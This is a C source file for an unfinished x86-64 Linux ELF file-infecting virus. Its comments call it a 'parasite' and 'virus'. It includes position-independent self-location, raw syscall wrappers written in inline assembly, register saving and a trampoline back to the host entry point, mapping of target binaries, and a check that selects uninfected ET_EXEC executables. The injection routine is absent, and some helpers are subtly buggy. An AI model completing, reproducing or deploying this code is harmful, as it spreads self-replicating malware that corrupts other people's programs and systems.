#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

/* libc */
void _memcpy(void *dst, void *src, unsigned int len);
int _memcmp(const void *s1, const void *s2, unsigned int n);

/* syscalls */
void Exit(long);
int _read(long fd, char *buf, unsigned long len);
long _write(long fd, char *buf, unsigned long len);
int _fstat(long fd, void *buf);
int _close(unsigned int fd);
long _open(const char *path, unsigned long flags, long mode);
void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off);
int _munmap(void *addr, size_t len);

/* customs */
unsigned long get_rip(void);
void end_code(void);
void dummy_marker(void);

#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char*)&get_rip_label - (char*)target))

#define __ASM__ __asm__ __volatile__

#define RODATA_PADDING 17000 //enough bytes to also copy .rodata and virus

extern long real_start;
extern long get_rip_label;

typedef struct elfbin {
	/* Headers */
	Elf64_Ehdr* ehdr;
	Elf64_Phdr* phdr;
	Elf64_Shdr* shdr;
	Elf64_Dyn* dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	/* Memory */	
	uint8_t* mem;
	size_t size;	
	/* File info */
	char* path;
	struct stat st;
	int fd;
	/* Else */
	int original_virus_exe;
} elfbin_t;

int _start() {
	/*
	 * Save register state before executing parasite code.
	 */
	__ASM__(
		".globl real_start	\n"
		"real_start: 		\n"
		"push %rsp 			\n"
		"push %rbp 			\n"
	 	"push %rax			\n"
	 	"push %rbx			\n"
	 	"push %rcx			\n"
	 	"push %rdx			\n"
	 	"push %r8			\n"
	 	"push %r9			\n"
	 	"push %r10			\n"
	 	"push %r11			\n"
	 	"push %r12			\n"
	 	"push %r13			\n"
	 	"push %r14			\n"
	 	"push %r15	  		");

	__ASM__(
		"call do_main 		");

	/*
	 * Restore register state
	*/
	__ASM__(
		"pop %r15			\n"
	 	"pop %r14			\n"
	 	"pop %r13			\n"
	 	"pop %r12			\n"
	 	"pop %r11			\n"
	 	"pop %r10			\n"
	 	"pop %r9			\n"
	 	"pop %r8			\n"
	 	"pop %rdx			\n"
	 	"pop %rcx			\n"
	 	"pop %rbx			\n"
	 	"pop %rax			\n"
	 	"pop %rbp			\n"
	 	"pop %rsp			\n"	
	 	"add $0x8, %rsp		\n"
	 	"jmp end_code		"); 
}

void do_main() {
	/* Declare variables */
	char cwd[2];	
	ssize_t cwd_fd;
	
	/* Code */
	cwd[0] = '.';
	cwd[1] = '\0';

	cwd_fd = _open(cwd, O_RDONLY | O_DIRECTORY, 0);
	if (cwd_fd < 0) {
		return;
	}
}

/* Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program header etc. 
 */
int load_self(elfbin_t* elf) {
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);

	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
	elf->mem = (uint8_t*)_start_addr;
	elf->size = (char*)&end_code - (char*)&_start;
	elf->size += (int)((char*)f2 - (char*)f1);

	//elf->size += RODATA_PADDING;
	return 0;
}

void unload_target(elfbin_t* elf) {	
	_munmap(elf->mem, elf->size);
	_close(elf->fd);
}

int load_target(const char *path, elfbin_t* elf) {
	int i;
	struct stat st;
	elf->path = (char*)path;
	int fd = _open(path, O_RDONLY, 0);
	if (fd < 0) {
		return -1;
	}
	elf->fd = fd;
	if (_fstat(fd, &st) < 0) {
		return -1;
	}
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED) {
		return -1;
	}

	elf->ehdr = (Elf64_Ehdr*)elf->mem;
	elf->phdr = (Elf64_Phdr*)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr*)&elf->mem[elf->ehdr->e_shoff];

	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		switch(elf->phdr[i].p_type) {
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
					case 0:
						elf->textVaddr = elf->phdr[i].p_vaddr;
						elf->textSize = elf->phdr[i].p_memsz;
					break;
					case 1:
						elf->dataVaddr = elf->phdr[i].p_vaddr;
						elf->dataSize = elf->phdr[i].p_memsz;
						elf->dataOff = elf->phdr[i].p_offset;
					break;
				}
			break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn*)&elf->mem[elf->phdr[i].p_offset];
			break;
			default: break;
		}
	}
	elf->st = st;
	elf->size = st.st_size;
	return 0;
}

/*
 * Must be ELF
 * Must be ET_EXEC
 * Must not be yet injected
 */
int check_criteria(char *filename) {
	int fd;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[PAGE_SIZE];
	uint32_t magic;

	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0) {
		return -1;
	}
	if (_read(fd, mem, PAGE_SIZE) < 0) {
		return -1;
	}
	_close(fd);
		
	ehdr = (Elf64_Ehdr*)mem;
	phdr = (Elf64_Phdr*)&mem[ehdr->e_phoff];

	/* Check if file is ELF format */
	/* first 4 bits != 0x7fELF */
	if (_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
		return -1;
	}
	
	/* Check if file already infected (has magic) */
	// TODO:	

	/* Check if file is ET_EXEC */
	if (ehdr->e_type != ET_EXEC) {
		return -1;
	}
	
	/* Now supported only x86_64 */
	if (ehdr->e_machine != EM_X86_64) {
		return -1;
	}
	
	return 0;
}

void Exit(long status) {
	__asm__ volatile(
		"mov %0, %%rdi		\n"
		"mov $60, %%rax  	\n"
	    "syscall": : "r"(status));	
}

int _read(long fd, char *buf, unsigned long len) {
         long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $0, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _write(long fd, char *buf, unsigned long len) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $1, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;
}

int _fstat(long fd, void *buf) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $5, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _close(unsigned int fd) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $3, %%rax\n"
                        "syscall" : : "g"(fd));
        return (int)ret;
}

long _open(const char *path, unsigned long flags, long mode) {
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
                        "mov $2, %%rax\n"
                        "syscall" : : "g"(path), "g"(flags), "g"(mode));
        asm ("mov %%rax, %0" : "=r"(ret));
        return ret;
}

void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off) {
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov %4, %%r8\n"
                         "mov %5, %%r9\n"
                         "mov $9, %%rax\n"
                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
        asm ("mov %%rax, %0" : "=r"(ret));              
        return (void *)ret;
}

int _munmap(void *addr, size_t len){
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $11, %%rax\n"
                        "syscall" :: "g"(addr), "g"(len));
        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

/* --------------------- LibC ---------------------------------- */

void _memcpy(void *dst, void *src, unsigned int len) {
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;
        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }
}

int _memcmp(const void *s1, const void *s2, unsigned int n) {
        unsigned char u1, u2;
        for ( ; n-- ; s1++, s2++) {
                u1 = * (unsigned char *) s1;
                u2 = * (unsigned char *) s2;
        if ( u1 != u2) {
                return (u1-u2);
        }
    }
}

/* -------------------- Custom ----------------------------------- */

unsigned long get_rip(void) {
	long ret;
	__asm__ __volatile__(
		"call get_rip_label		\n"
		".globl get_rip_label 	\n"
		"get_rip_label: 		\n"
		"pop %%rax  			\n"
		"mov %%rax, %0" : "=r"(ret)
	);
	return ret;
}	

/*
 * end_code() gets over_written with a trampoline
 * that jumps to the original entry point.
 */
void end_code() {
	Exit(0);
}

void dummy_marker() {
	__ASM__("nop");
}
